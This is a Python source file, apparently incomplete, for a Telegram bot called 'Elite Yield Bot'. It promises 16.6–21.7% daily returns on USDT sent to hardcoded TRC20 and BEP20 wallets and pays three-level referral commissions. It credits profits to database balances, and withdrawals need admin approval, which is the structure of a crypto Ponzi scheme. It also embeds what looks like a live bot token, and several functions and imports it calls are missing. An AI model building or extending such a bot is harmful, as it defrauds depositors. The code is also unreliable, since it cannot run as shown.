import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import sqlite3
import time
import logging
from datetime import datetime

logging.basicConfig(filename='bot_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

BOT_TOKEN = '8268425583:AAFkSCeYzXAU2gcyz-tZLSwpzVg0uZ061IU'
ADMIN_ID = 7989867522
ADMIN_USERNAME = '@YourAdminUsername'

bot = telebot.TeleBot(BOT_TOKEN)

TRC20_WALLET = "TQzZgrHNtG9i8mGufpvW12sxFuy"
BEP20_WALLET = "0x7485e33695b722aA071A868bb6959533a3e449b02E"

conn = sqlite3.connect('elite_yield.db', check_same_thread=False)
cursor = conn.cursor()
cursor.execute('''CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    balance REAL DEFAULT 0,
    total_profit REAL DEFAULT 0,
    level TEXT DEFAULT 'Bronze',
    last_profit_time INTEGER DEFAULT 0,
    referrer_id INTEGER DEFAULT NULL,
    created_at INTEGER DEFAULT 0,
    language TEXT DEFAULT 'en',
    deposit_amount REAL DEFAULT 0
)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS pending_deposits (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    username TEXT,
    amount REAL,
    status TEXT DEFAULT 'pending',
    created_at INTEGER
)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS pending_withdraws (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    username TEXT,
    amount REAL,
    wallet_address TEXT,
    status TEXT DEFAULT 'pending',
    created_at INTEGER
)''')
cursor.execute('''CREATE TABLE IF NOT EXISTS support_messages (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    username TEXT,
    message_text TEXT,
    status TEXT DEFAULT 'new',
    created_at INTEGER
)''')
conn.commit()

languages = {
    'en': {
        'welcome': """🌟 Welcome to Elite Yield Bot! 🚀

Unlock up to 21.7% DAILY returns on your USDT investments! 💰

💎 Levels based on deposit:
• $10-99: 16.6%
• $100-799: 17.9%  
• $800-2399: 19.6%
• $2400-5999: 21.7%

💳 Min deposit: $10 USDT
🌐 Networks: TRC20 or BEP20

Start earning passive income today! 📈""",
        'balance_btn': '💰 Balance',
        'deposit_btn': '💳 Deposit',
        'withdraw_btn': '💸 Withdraw',
        'referral_btn': '👥 Referral',
        'support_btn': '📞 Support',
        'admin_btn': '🛠 Admin Panel',
        'balance': """💰 Your Balance: ${balance:.2f} USDT
📈 Total Profit: ${total_profit:.2f} USDT
💎 Level: {level}""",
        'deposit_instructions': """💳 Deposit Instructions:

Send USDT to one of these addresses:
🌐 TRC20 (Tron): `{TRC20_WALLET}`
🌐 BEP20 (BSC): `{BEP20_WALLET}`

💡 Minimum: $10
⚠️ Only USDT - no other tokens!

Enter amount to deposit:""",
        'enter_amount': 'Enter amount (min $10):',
        'invalid_amount': '❌ Invalid amount!',
        'confirm_deposit': 'Confirm ${amount}',
        'withdraw_submitted': '✅ Withdrawal request submitted! Waiting for admin approval...',
        'referral_text': """👥 Your Referral Link:
`{ref_link}`

📊 Referrals: {ref_count}
💰 Earn 10% L1, 8% L2, 3% L3 commissions!""",
        'support': 'Send your message to support:',
        'choose_language': 'Choose your language:',
        'english': 'English 🇺🇸',
        'persian': 'Persian 🇮🇷',
        'turkish': 'Turkish 🇹🇷',
        'arabic': 'Arabic 🇸🇦',
        'daily_profit': '📈 Daily profit added: ${profit:.2f} ({rate}% rate)!\nNew balance: ${new_balance:.2f}',
        'support_tickets_btn': '📞 Support Tickets'
    },
    # fa, tr, ar: مشابه en, btnها ترجمه (مثل 'پشتیبانی' برای support_btn)
    'fa': {
        'welcome': """🌟 خوش آمدید به Elite Yield Bot! 🚀

بازدهی تا 21.7% روزانه روی سرمایه USDT خود را باز کنید! 💰

💎 سطوح بر اساس واریز:
• 10-99$: 16.6%
• 100-799$: 17.9%  
• 800-2399$: 19.6%
• 2400-5999$: 21.7%

💳 حداقل واریز: 10$ USDT
🌐 شبکه‌ها: TRC20 یا BEP20

از امروز درآمد غیرفعال کسب کنید! 📈""",
        'balance_btn': '💰 موجودی',
        'deposit_btn': '💳 واریز',
        'withdraw_btn': '💸 برداشت',
        'referral_btn': '👥 رفرال',
        'support_btn': '📞 پشتیبانی',
        'admin_btn': '🛠 پنل ادمین',
        'support_tickets_btn': '📞 تیکت‌های پشتیبانی',
        # ... بقیه ترجمه
    },
    # tr and ar similar
}

def get_user_lang(user_id):
    try:
        cursor.execute('SELECT language FROM users WHERE user_id = ?', (user_id,))
        result = cursor.fetchone()
        conn.commit()
        return result[0] if result else 'en'
    except:
        return 'en'

def main_menu(is_admin=False, lang='en'):
    l = languages[lang]
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(l['balance_btn'], l['deposit_btn'])
    markup.add(l['withdraw_btn'], l['referral_btn'])
    markup.add(l['support_btn'])
    if is_admin:
        markup.add(l['admin_btn'])
    return markup

def admin_menu(lang='en'):
    l = languages[lang]
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add('👥 Users List', '⏳ Pending Requests')
    markup.add('📊 Statistics', l['support_tickets_btn'])
    markup.add('🔙 Back to Main')
    return markup

@bot.message_handler(commands=['start'])
def start_message(message):
    user_id = message.from_user.id
    username = message.from_user.username or f"User_{user_id}"
    args = message.text.split()
    
    referrer_id = None
    if len(args) > 1 and args[1].startswith('ref_'):
        try:
            referrer_id = int(args[1].split('_')[1])
            if referrer_id != user_id:
                cursor.execute('UPDATE users SET referrer_id = ? WHERE user_id = ?', (referrer_id, user_id))
                conn.commit()
                bot.send_message(referrer_id, '🎉 New referral joined!')
        except Exception as e:
            logging.error(f'Referral error: {e}')
    
    lang = get_user_lang(user_id)
    l = languages[lang]
    
    try:
        cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        if not cursor.fetchone():
            current_time = int(time.time())
            cursor.execute('INSERT INTO users (user_id, username, created_at, language) VALUES (?, ?, ?, ?)', (user_id, username, current_time, lang))
            conn.commit()
            bot.send_message(message.chat.id, l['choose_language'], reply_markup=language_menu())
            return
    except Exception as e:
        logging.error(f'Start DB error: {e}')
    
    cursor.execute('UPDATE users SET username = ? WHERE user_id = ?', (username, user_id))
    conn.commit()
    
    is_admin = user_id == ADMIN_ID
    
    try:
        with open('welcome_banner.jpg', 'rb') as banner:
            bot.send_photo(message.chat.id, banner, caption=l['welcome'], reply_markup=main_menu(is_admin, lang))
    except FileNotFoundError:
        bot.send_message(message.chat.id, l['welcome'], reply_markup=main_menu(is_admin, lang))

@bot.callback_query_handler(func=lambda call: call.data.startswith('lang_'))
def set_language(call):
    lang = call.data.split('_')[1]
    cursor.execute('UPDATE users SET language = ? WHERE user_id = ?', (lang, call.from_user.id))
    conn.commit()
    bot.answer_callback_query(call.id, "Language set!")
    start_message(call.message)

@bot.message_handler(func=lambda message: True)
def handle_menu(message):
    user_id = message.from_user.id
    lang = get_user_lang(user_id)
    l = languages[lang]
    
    try:
        cursor.execute('SELECT balance, total_profit, level FROM users WHERE user_id = ?', (user_id,))
        user_data = cursor.fetchone()
        conn.commit()
    except Exception as e:
        logging.error(f'Balance DB error: {e}')
        user_data = None
    
    balance = user_data[0] if user_data else 0
    
    is_admin = user_id == ADMIN_ID
    
    if message.text == l['balance_btn']:
        text = l['balance'].format(balance=balance, total_profit=user_data[1] if user_data else 0, level=user_data[2] if user_data else 'Bronze')
        bot.send_message(message.chat.id, text, reply_markup=main_menu(is_admin, lang))
    
    elif message.text == l['deposit_btn']:
        bot.send_message(message.chat.id, l['deposit_instructions'].format(TRC20_WALLET=TRC20_WALLET, BEP20_WALLET=BEP20_WALLET))
        msg = bot.send_message(message.chat.id, l['enter_amount'])
        bot.register_next_step_handler(msg, process_deposit_amount)
    
    elif message.text == l['withdraw_btn']:
        if balance < 1:
            bot.send_message(message.chat.id, '❌ Minimum withdrawal $1', reply_markup=main_menu(is_admin, lang))
            return
        msg = bot.send_message(message.chat.id, l['enter_amount'])
        bot.register_next_step_handler(msg, process_withdraw_request)
    
    elif message.text == l['referral_btn']:
        ref_link = f't.me/eliteyieldbot?start=ref_{user_id}'
        try:
            cursor.execute('SELECT COUNT(*) FROM users WHERE referrer_id = ?', (user_id,))
            ref_count = cursor.fetchone()[0]
            conn.commit()
        except:
            ref_count = 0
        text = l['referral_text'].format(ref_link=ref_link, ref_count=ref_count)
        bot.send_message(message.chat.id, text, reply_markup=main_menu(is_admin, lang), parse_mode='Markdown')
    
    elif message.text == l['support_btn']:
        bot.send_message(message.chat.id, l['support'])
        bot.register_next_step_handler(message, forward_support_to_admin)
    
    if is_admin and message.text == l['admin_btn']:
        bot.send_message(message.chat.id, 'Admin Panel', reply_markup=admin_menu(lang))
    
    if is_admin:
        if message.text == l['support_tickets_btn']:
            try:
                cursor.execute('SELECT id, user_id, username, message_text, created_at FROM support_messages WHERE status = "new" ORDER BY created_at DESC')
                tickets = cursor.fetchall()
                conn.commit()
                if not tickets:
                    bot.send_message(message.chat.id, 'No new tickets.')
                    return
                for ticket in tickets:
                    markup = InlineKeyboardMarkup()
                    markup.add(InlineKeyboardButton('Reply', callback_data=f'support_reply_{ticket[0]}'), InlineKeyboardButton('Seen', callback_data=f'support_seen_{ticket[0]}'))
                    bot.send_message(message.chat.id, f"Ticket {ticket[0]} from {ticket[2]} (ID: {ticket[1]})\nText: {ticket[3]}\nTime: {datetime.fromtimestamp(ticket[4])}", reply_markup=markup)
            except Exception as e:
                logging.error(f'Support tickets error: {e}')
    
    # سایر admin options ...

def forward_support_to_admin(message):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or 'Unknown'
        text = message.text
        current_time = int(time.time())
        cursor.execute('INSERT INTO support_messages (user_id, username, message_text, created_at) VALUES (?, ?, ?, ?)', (user_id, username, text, current_time))
        conn.commit()
        ticket_id = cursor.lastrowid
        bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton('Reply', callback_data=f'support_reply_{ticket_id}'), InlineKeyboardButton('Seen', callback_data=f'support_seen_{ticket_id}'))
        bot.send_message(ADMIN_ID, f"New support ticket {ticket_id} from {username} (ID: {user_id})", reply_markup=markup)
        bot.send_message(message.chat.id, 'Message sent to support!')
    except Exception as e:
        logging.error(f'Support forward error: {e}')

# بقیه توابع (process_deposit_amount, callback_handler, add_daily_profit, etc.) با try/except و conn.commit()

if __name__ == '__main__':
    threading.Thread(target=add_daily_profit, daemon=True).start()
    print("🚀 Elite Yield Bot starting...")
    bot.polling(none_stop=True)
